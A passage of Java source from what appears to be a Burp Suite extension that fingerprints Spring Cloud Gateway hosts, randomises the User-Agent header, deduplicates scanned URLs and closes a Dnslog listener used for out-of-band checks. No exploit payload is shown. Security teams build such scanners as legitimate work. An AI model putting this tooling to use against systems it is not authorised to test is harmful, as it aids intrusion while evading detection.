            String body = new String(requestResponse.getResponse()).substring(this.helpers.analyzeResponse(requestResponse.getResponse()).getBodyOffset()).toLowerCase();
            if (body.contains("route_id")) {
                this.burpExtender.stdout.println("[*] Detect SpringGateway Finger: " + url);
                return true;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            this.burpExtender.stderr.println(e.getMessage());
        }
        return false;
    }

    /**
     * 随机Agent头
     * 先将原来的Agent删掉，再添加随机Agent
     * @param httpRequestResponse
     * @return
     */
    private byte[] randomHeader(IHttpRequestResponse httpRequestResponse) {
        IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
        byte[] rawRequest = httpRequestResponse.getRequest();
        List<String> headers = requestInfo.getHeaders();
        // 先删除User-Agent，再添加随机的User-Agent
        for (String header: headers) {
//            this.burpExtender.stdout.println("header " + header);
            if (header.startsWith("User-Agent")) {  // 坑点: 带冒号匹配会报错
                headers.remove(header);
                headers.add("User-Agent: " + RandomHeaders.randomHeader());
                break;
            }
        }
        // 获取body
        byte[] bodyRequest = new String(rawRequest).substring(requestInfo.getBodyOffset()).getBytes();
        // 拼接header和body
        return this.helpers.buildHttpMessage(headers, bodyRequest);
    }

    /**
     * 归一化请求包
     * 格式: ${url} + GET/POST
     * @param requestInfo
     * @return MD5
     */
    private String normalized(IRequestInfo requestInfo) {
        String type = requestInfo.getMethod();
        String url = String.valueOf(requestInfo.getUrl()).split("\\?")[0];  // 获取?之前的url
        return Utils.MD5(url + "+" + type);
    }

    /**
     * 是否已扫描过
     * @param url_md5
     * @return
     */
    private boolean isChecked(String url_md5) {
        return this.allScan.contains(url_md5);
    }

    /**
     * 关闭持续监听的Dnslog
     */
    public void close() {
        if (this.backend != null) {
            this.backend.close();
        }
    }
}
